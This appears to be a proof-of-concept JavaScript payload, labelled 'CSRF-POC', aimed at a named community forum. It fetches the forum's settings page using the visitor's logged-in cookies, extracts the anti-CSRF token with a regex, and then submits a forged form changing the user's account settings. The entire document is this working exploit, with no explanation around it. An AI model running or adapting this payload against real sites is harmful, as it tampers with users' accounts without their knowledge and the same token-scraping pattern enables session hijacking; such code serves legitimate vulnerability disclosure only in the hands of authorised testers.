setTimeout(function(){
  fetch('https://communityforums.atmeta.com/settings/general',{credentials:'include'})
  .then(function(r){return r.text();})
  .then(function(html){
    var m=html.match(/name="yip_csrf_token"[^>]*value="([^"]+)"|value="([^"]+)"[^>]*name="yip_csrf_token"/);
    var tok=m?(m[1]||m[2]):'FAKEFAKE';
    console.log('CSRF-POC tok:',tok.substring(0,10));
    var body='yip_csrf_token='+encodeURIComponent(tok)
      +'&GeneralSettingsForm%5Bshowreputation%5D=&GeneralSettingsForm%5Bshowreputation%5D=1'
      +'&GeneralSettingsForm%5Bshowusertitle%5D=&GeneralSettingsForm%5Bshowusertitle%5D=1'
      +'&GeneralSettingsForm%5Baddtofavorites%5D=&GeneralSettingsForm%5Baddtofavorites%5D=1'
      +'&GeneralSettingsForm%5Bshowunreadpostscounter%5D=&GeneralSettingsForm%5Bshowunreadpostscounter%5D=0'
      +'&GeneralSettingsForm%5Breceivepmbuddies%5D=&GeneralSettingsForm%5Breceivepmbuddies%5D=0'
      +'&yt0=Save+changes';
    return fetch('https://communityforums.atmeta.com/settings/general',{
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:body
    });
  })
  .then(function(r){console.log('CSRF-POC settings:',r.status,r.url);})
  .catch(function(e){console.log('CSRF-POC err:',e);});
},2000);
